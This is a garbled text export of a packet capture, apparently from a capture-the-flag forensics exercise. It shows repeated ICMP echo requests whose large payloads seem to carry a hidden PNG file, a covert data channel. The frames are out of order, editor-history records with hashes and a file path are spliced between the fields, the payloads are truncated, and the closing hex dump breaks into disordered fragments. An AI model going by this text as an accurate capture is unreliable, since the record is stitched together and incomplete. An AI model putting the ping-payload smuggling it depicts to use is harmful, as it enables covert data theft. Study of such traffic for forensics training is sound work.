	    534 92.178227245   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 535)
	
	Frame 534: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xa73d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 535]
	    Data (622 bytes)
	
c26790592dfe5a9c86c8333ccd9acc83|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 76689da3d75ccb43a74ed30d9dc4d30ab2d2d61062a8f65a‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    538 93.262334681   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 539)
	
	Frame 538: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x491d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 539]
	    Data (622 bytes)
	
4094674409b326a44aef0f44e290e87c|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 01e85402bed262bb54aa9a1175a244d5ec4b8d9e8b517ead‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    540 93.808120245   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 541)
	
	Frame 540: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x5083 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 541]
	    Data (622 bytes)
	
2c83f5b658406d131b7f85aa343edada|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 3602d4d9473f52da540f41d0c6ae907969a46738cba88f63‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    542 94.343987855   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 543)
	
	Frame 542: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xe6d3 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 543]
	    Data (622 bytes)
	
89459519b3c75b26f11e180c22abed00|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: f4fb941605dc1213e488361ae7850e536aea554ac23b0136‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    546 95.436830904   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 547)
	
	Frame 546: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x2738 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 547]
	    Data (622 bytes)
	
84c316321483d835e372c648a47bbdb2|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 211eab3ab949c5498293564ad09395fb559210e3c7402865‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    548 95.980422505   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 549)
	
	Frame 548: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xadf1 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 549]
	    Data (622 bytes)
	
3c4d14d9fac7b75c752df84c9bdef01d|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 94ac20e5ccb0581287c8a49d50ac8839eb0c1b870f31d958‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    544 94.890577222   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 545)
	
	Frame 544: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x1d8d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 545]
	    Data (622 bytes)
	
38a5cb22315ab2104c208356a8201050|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 0561bea0efc53770e8078a3338ebe9b6e752de9db4a28e33‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    550 96.526732605   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 551)
	
	Frame 550: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4413 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 551]
	    Data (622 bytes)
	
91e098ba1dfb7eade49d7bbf6cd38e2a|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 3279a472e013c9902ef24814abfd488aa49ea4ebf1489fff‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    554 97.610743197   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 555)
	
	Frame 554: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x5af0 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 555]
	    Data (622 bytes)
	
4cc80f1a2b311fa963af085a640825d2|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 1b9c176fc7e9a143a4be5fd14bb431747d10b7fba5e8a16a‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    556 98.167089189   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 557)
	
	Frame 556: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4c7a [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 557]
	    Data (622 bytes)
	
fa9afc8e3f77d48159283fcf1ad8ee42|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: fb596b8a31146b51c6a2c680a78c9c33e7c84613c2807506‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    558 98.722534930   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 559)
	
	Frame 558: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xed7d [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 559]
	    Data (622 bytes)
	
d34ee9bf9438a5334872f82fd798cc7d|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: e0bd460d800d11143590a7ada175a1d413daeb0e23f8cab1‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    560 99.272662349   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 561)
	
	Frame 560: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xcd93 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 561]
	    Data (622 bytes)
	
259459e1a99acf4b8e424f6cb9f67be4|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: fc5bc9996d597c0f558367661e50eae6e8c4f0a4130d51e8‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    562 99.808782705   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 563)
	
	Frame 562: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xbe99 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 563]
	    Data (622 bytes)
	
ad29cac52c5339e09a34d5231c2bf1bd|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: f9c94ffdbcf5a02d68628441b02b3706f68cfda2611c9483‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    564 100.341052484  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 565)
	
	Frame 564: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xefc2 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 565]
	    Data (622 bytes)
	
efce7dab05a42c42bb061f049c62a023|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 293989dd13bd8b762700eace01b41665a94b10d4409d264d‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    566 100.882815948  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 567)
	
	Frame 566: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x092e [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 567]
	    Data (622 bytes)
	
31d603f2e88091b1db821477a91b48b3|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: fa921725a5719df5a0bb0c3178eb764122fe868db74e377f‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    570 101.958386668  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 571)
	
	Frame 570: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xf4a9 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 571]
	    Data (622 bytes)
	
791365398873ee0e64a99039b1166916|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: a465574773dc547e6369f27338ddde5252e2ee97bfe4fee5‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    568 101.421879518  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 569)
	
	Frame 568: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x481b [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 569]
	    Data (622 bytes)
	
0c95236b0889158d5ac5247a297117ce|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: c35c986607ae3cbc725a8697de8e9e0de683f3f054bc2c37‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    572 102.498062674  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 573)
	
	Frame 572: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x6ff2 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 573]
	    Data (622 bytes)
	
93718ae7a5fa37abda30e0350f0c1dab|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 4314e25dc35e7b7cc471e926bf7f7386941e7089114f694e‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    574 103.029622464  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 575)
	
	Frame 574: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x55bf [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 575]
	    Data (622 bytes)
	
7a45127ec4334d39a0f26cbbbe298625|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 3616411e405cf83dc7c2c90fa3ed3d6a5f8d01ea59b7046f‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    578 104.110537856  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 579)
	
	Frame 578: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x02a4 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 579]
	    Data (622 bytes)
	
9d0deaab180346343a9182f77e179471|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 423c5973729dd41cc2e0e0364da2b4561d5452265a0ff4aa‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    576 103.575305783  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 577)
	
	Frame 576: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xf857 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 577]
	    Data (622 bytes)
	
ffdae3e31f984b2e77320b099c901f8c|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: ae3808ad56ef03851d8f75f72fc40c355857f72fa4b8845c‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    580 104.652027991  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 581)
	
	Frame 580: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x04f2 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 581]
	    Data (622 bytes)
	
966647fbbfebacd37dd4058808d505b3|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 49d34c5385ad3a98c56035c33451e6996d5b58cff72ea997‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    582 105.211418941  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 583)
	
	Frame 582: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xd31e [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 583]
	    Data (622 bytes)
	
232a1b0f639231c701f6603b8f79acf0|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: e600c45cc159477fca0245d75a64932398469f30002f3e8b‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    584 105.761017007  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 585)
	
	Frame 584: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xcd21 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 585]
	    Data (622 bytes)
	
49ab9754adf9f9ef81286f536a525f8c|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 7c73e3fe88dbcae77ff2a7acf7279697af38bfbce3747722‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    586 106.295030624  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 587)
	
	Frame 586: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x4521 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 587]
	    Data (622 bytes)
	
2b48ffebf6d382bfcc70cf8e59459bc7|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 1296089003c63d38872a297a5dbaabc3ec3763f41db33ae9‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    588 106.846544477  10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 589)
	
	Frame 588: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xc2f4 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 589]
	    Data (622 bytes)
	
5b624cfc2c38943dd3bd1e2d5566b00a|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: aeae6a234e11d1a4f4eec01c6b7d57c3c97371a46a68627a‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    590 107.384976082  10.0.3.15             176.28.50.165         ICMP     121    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 591)
	
	Frame 590: 121 bytes on wire (968 bits), 121 bytes captured (968 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0x690a [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 591]
	    Data (77 bytes)
	
f864874a6e2ab190dccb68b671aaf092|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	Data: cd0d693ab8fa6b8f1b482dee801ef49550da41a0ae94e515‚Ä¶
	[Length: 77]
4dd3d3558bc1aeb723bf803f195d4751|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: 3c0a454244cf4390126ea64879d71ae2507f970b2401eb68‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    552 97.066505014   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 553)
	
	Frame 552: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xfc4c [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 553]
	    Data (622 bytes)
	
fc7f8d1118bf5ca5b17d3d9391490ec8|file:///home/neo/ccsc/echoes/bytes.txt|6441|1|V|text
	        Data: cacfced20f81d9da3abba736c91a86146157b4429be984a1‚Ä¶
	        [Length: 622]
	
	No.     Time           Source                Destination           Protocol Length Info
	    528 90.578171397   10.0.3.15             176.28.50.165         ICMP     666    Echo (ping) request  id=0x0000, seq=0/0, ttl=64 (reply in 529)
	
	Frame 528: 666 bytes on wire (5328 bits), 666 bytes captured (5328 bits) on interface 0
	Linux cooked capture
	Internet Protocol Version 4, Src: 10.0.3.15, Dst: 176.28.50.165
	Internet Control Message Protocol
	    Type: 8 (Echo (ping) request)
	    Code: 0
	    Checksum: 0xebe2 [correct]
	    [Checksum Status: Good]
	    Identifier (BE): 0 (0x0000)
	    Identifier (LE): 0 (0x0000)
	    Sequence number (BE): 0 (0x0000)
	    Sequence number (LE): 0 (0x0000)
	    [Response frame: 529]
	    Data (622 bytes)
	
290edad496907e66931b56bb4118021c|file:///home/neo/ccsc/echoes/bytes.txt|1|1|v|text
	0000  
59f4b8fa653524b6ba098161413b2f21|file:///home/neo/ccsc/echoes/bytes.txt|1|1|v|text
	0000  89 
44c8d987c645319a2ee36941caacc9ce|file:///home/neo/ccsc/echoes/bytes.txt|1|48|v|text
	   .PNG........IHDR
f230ee2bc006049ac7b144f7e1194d1e|file:///home/neo/ccsc/echoes/bytes.txt|3|48|v|text
	0010  
c418f09e9ef7646635adb9be69f2a4e1|file:///home/neo/ccsc/echoes/bytes.txt|3|48|v|text
	   ............./Cw
c7055171bb3793eb149083eb42c98be7|file:///home/neo/ccsc/echoes/bytes.txt|3|48|v|text
	   .....pHYs.......
5eb1a3ccbe17fc58bc90eb2505e408fe|file:///home/neo/ccsc/echoes/bytes.txt|3|48|v|text
	0020  
5ee9508116d8d76893fc2dc7b3319b43|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0030  
71d71cbfcf5b9f0147a2341029054e73|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..y.dUy...9.Vu.>
e4ff707d1d999990775e8aec9faf402e|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0040  
5707e44af604b8ee76caea3966aa7edf|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ...:..2.....(.1.
e88891c82fbd443e8650720249ae903f|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0050  
e65d956c04d6b56963dd8600b5df6c33|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   ..P...K.&/b....O
186bd4e607a093f669e4ba748a1d4767|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0070  
60ce87038f6b41cacea9daff81fcd8fa|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0060  
1410ebceb54699c2dcc675f866e624d1|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	4" .......
06bf04019e591a24ebf2b222efc98598|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	   .....`..<.....>.
8381b46d93f81f8cccf69ada82cbcb1d|file:///home/neo/ccsc/echoes/bytes.txt|6440|48|v|text
	0080  
